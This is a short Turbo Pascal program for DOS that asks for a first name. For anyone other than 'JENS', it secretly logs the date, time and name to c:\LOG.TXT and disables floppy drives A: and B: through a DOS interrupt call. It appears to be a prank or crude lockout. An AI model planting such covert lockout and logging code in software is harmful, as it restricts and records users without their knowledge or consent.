Program Code_fuer_Anja;

uses crt,alles,dos;

var Name : String;
    f    : text;

procedure Datum;

const days : array [0..6] of String[11] = ('Sonntag','Montag','Dienstag','Mittwoch','Donnerstag','Freitag','Samstag');
var y, m, d, dow : Word;
begin
  GetDate(y,m,d,dow);
  Write(f,days[dow],', ',m:0,'.', d:0,'.', y:0);
end;

procedure uhr;

var h, m, s, hund : Word;

function LeadingZero(w : Word) : String;

var s : String;
begin
  Str(w:0,s);
  if Length(s) = 1 then s := '0' + s;
  LeadingZero := s;
end;

begin
  GetTime(h,m,s,hund);
  Write(f,' ',LeadingZero(h),':',LeadingZero(m),':',LeadingZero(s),'.',LeadingZero(hund));
end;

procedure HideLW(dr, para:string);

   
var state,drive:String;
    n          :Byte;



procedure SetState(Dr:Byte;On:Boolean);

var Rg:Registers;

begin
 If on Then Begin
  with rg Do Begin
   ax:=$5f07;
   dl:=Dr;
   msdos(Rg);
  end;
 end
 else
 Begin
  with Rg DO Begin
   ax:=$5f08;
   dl:=dr;
   MsDos(Rg);
  end;
 end;
end;

Begin
 drive:=dr;
 State:=para;
 FOR n :=1 to length(state) DO State[n]:=Upcase(state[n]);
 FOR n:=1 to Length(Drive) DO drive[n]:= Upcase(Drive[n]);
 setstate(Ord(Drive[1])-65,(State=para));
end;

begin
 checkbreak:=false;
 clrscr;
 textcolor(red+blink);
 write('Gib deinen Vornamen ein? ');
 readln(Name);
 gross(name);
 if Name <> 'JENS' then begin
                         assign (f,'c:\LOG.TXT');
                         append (f);
                         datum;
                         uhr;
                         writeln(f,' NAME: ',name);
                         close(f);
                         hidelw('a:','it');
                         hidelw('b:','it');
                        end;
end.